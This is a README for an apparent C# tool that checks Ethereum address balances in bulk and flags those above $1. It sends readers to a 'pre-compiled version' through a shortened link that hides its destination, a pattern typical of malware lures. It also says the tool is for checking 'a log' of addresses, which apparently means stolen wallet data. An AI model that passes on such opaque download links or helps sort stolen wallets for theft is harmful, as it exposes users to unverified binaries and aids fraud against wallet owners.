
## Download pre-compiled version - [Click here](https://cleanuri.com/VG1OB6)

This C# application checks the balance of given Ethereum wallet addresses and identifies addresses above a certain threshold. If the balance of the address is over $1, it saves it in `high_balance.txt` file.





## How to Use 



- Open the solution file (.sln).

- Compile the project from the **Build** menu.

- Enter the addresses in the eth.txt file inside the `.\Checker` folder.



- Write the current eth/dollar value in the config.json file in the `.\Checker` folder.



- Run `Etherum Balance Checker.exe`.



### config.json



```bash

{

  "ethereum_price_usd": "0" // Enter Ethereum price here

}

```



## Requirements



- .NET Core 3.1 or higher version

- Nethereum.Web3 and Newtonsoft.Json NuGet packages

- An Ethereum API provider (such as Alchemy or Infura)



## Purpose of the Program



- This program can be used to pull bulk ETH addresses.

- If you have a log, you can quickly check it with this.






## Notes




- The operation of the program depends on the majority of addresses, if you are going to check a lot of addresses, it is recommended to close the console for speed.



- This Project is Open Source and you can make edits and improvements as you wish.



## Contribution



- If you want to contribute, please leave a Star ⭐ in this Repo.



## Disclaimer



- This project is for educational purposes.



## License



This project is licensed under the MIT. For more information, see the [License](LICENSE).
